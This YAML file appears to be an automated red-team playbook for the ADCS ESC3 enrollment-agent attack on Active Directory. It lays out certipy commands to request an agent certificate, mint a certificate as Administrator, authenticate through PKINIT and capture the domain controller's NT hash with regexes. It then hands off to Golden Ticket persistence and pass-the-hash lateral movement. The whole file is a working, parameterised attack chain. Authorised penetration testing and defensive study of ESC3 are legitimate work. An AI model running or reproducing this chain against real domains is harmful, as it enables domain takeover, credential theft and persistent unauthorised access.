id: esc3-adcs-enrollment-agent
name: "ADCS ESC3 — Enrollment Agent template chain"
description: >
  Template with Certificate Request Agent EKU lets you request a cert as
  ANYONE through a second template that allows enrollment-agent enrollment.
  Two-cert dance: get the agent cert first, then use it to mint the target
  cert.
tags: [adcs, esc3, priv-esc, certificates, enrollment-agent]
difficulty: medium

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password
    required: true

steps:
  - id: find_esc3
    name: "Find ESC3 template pair (agent + agent-enabled)"
    command_ref: certipy-find
    inputs:
      ip: "${dc_ip}"
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
    notes: |
      ESC3 needs TWO templates:
       1. A template with EKU `Certificate Request Agent` (1.3.6.1.4.1.311.20.2.1)
          AND your principal in Enrollment Rights.
       2. A template that allows enrollment by the Enrollment Agent.
      certipy-find prints both. Record each name.
    capture:
      - var: agent_template
        regex: 'Template Name\s*:\s*(\S+)\s*\n[\s\S]*?Vulnerabilities[\s\S]*?ESC3'
        match: first
      - var: ca_name
        regex: 'CA Name\s*:\s*(.+?)$'
        match: first

  - id: get_agent_cert
    name: "Request the agent certificate"
    inline_command: "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca>' -template '<agent_tpl>'"
    requires: [agent_template, ca_name]
    inputs:
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      dc-ip: "${dc_ip}"
      ca: "${ca_name}"
      agent_tpl: "${agent_template}"
    capture:
      - var: agent_pfx
        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
        match: first

  - id: use_agent_to_mint
    name: "Use agent cert to mint an Administrator certificate"
    command_ref: certipy-esc3
    requires: [agent_pfx, ca_name]
    inputs:
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      dc-ip: "${dc_ip}"
      ca_name: "${ca_name}"
    notes: |
      Specify `-on-behalf-of '<domain>/administrator'` and `-pfx <agent_pfx>`
      to chain the requests. Resulting PFX authenticates as Administrator.
    capture:
      - var: pfx_file
        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
        match: first

  - id: pkinit_auth
    name: "Authenticate as the impersonated identity"
    command_ref: certipy-auth
    requires: [pfx_file]
    inputs:
      pfx_file: "${pfx_file}"
      ip: "${dc_ip}"
    capture:
      - var: dc_nt_hash
        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
        match: first

references:
  - title: "Certified Pre-Owned — ESC3"
    url:   "https://posts.specterops.io/certified-pre-owned-d95910965cd2"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'dc_nt_hash captured'
    reason: 'Golden Ticket persistence.'
  - chain: pth-lateral-spread
    when:   'dc_nt_hash captured'
    reason: 'Spread the recovered hash.'
